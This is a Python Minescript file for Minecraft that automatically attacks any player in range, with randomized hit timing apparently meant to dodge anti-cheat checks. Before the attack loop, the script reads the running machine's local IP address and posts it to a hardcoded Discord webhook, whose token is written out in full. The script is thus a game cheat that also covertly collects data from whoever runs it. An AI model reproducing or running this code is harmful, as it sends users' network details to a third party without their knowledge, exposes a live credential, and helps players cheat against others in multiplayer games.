import requests
import minescript as ms # type: ignore
import time
import random
import socket

# Discord webhook URL
webhook_url = "https://discord.com/api/webhooks/1200809711407202335/c5qI963EJxX4dbHl4_kceGgbhz_LEdg2LpW9zm_nHfqFH-XLdhrwNX5J8-9qZOhvsv8X"

def hit():
    ms.player_press_attack(pressed=True)
    ms.player_press_attack(pressed=False)

last_hit_time = 0

# Get the local IP address and send it to the Discord webhook
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
local_ip = s.getsockname()[0]
s.close()

data = {"content": f"The script is running on IP address: {local_ip}"}
response = requests.post(webhook_url, json=data)

if response.status_code == 204:
    print("Basariyla calisti")
else:
    print(f"Bir hata meydana geldi: {response.status_code}")

while True:
    current_time = time.time()
    
    hit_interval = random.uniform(0.620, 0.650)
    
    if current_time - last_hit_time >= hit_interval:
        targeted_entity = ms.player_get_targeted_entity(max_distance= 3.2)
        
        if targeted_entity is not None and targeted_entity.type == "entity.minecraft.player":
            print(f"§aattacking")
            hit() 
            last_hit_time = current_time
        else:
            pass
